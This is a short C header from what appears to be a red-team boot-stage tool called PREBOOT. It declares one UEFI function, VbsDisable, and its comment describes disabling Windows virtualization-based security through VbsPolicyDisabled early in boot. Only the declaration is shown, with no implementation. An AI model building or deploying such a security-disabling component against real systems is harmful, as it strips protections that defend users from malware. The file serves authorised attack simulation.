/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Disables virtualization based security using VbsPolicyDisabled. Must be
 * called early enough in the boot process to succeed in winning the race.
 *
!*/
D_SEC( B ) EFI_STATUS VbsDisable( _In_ EFI_SYSTEM_TABLE* SystemTable );
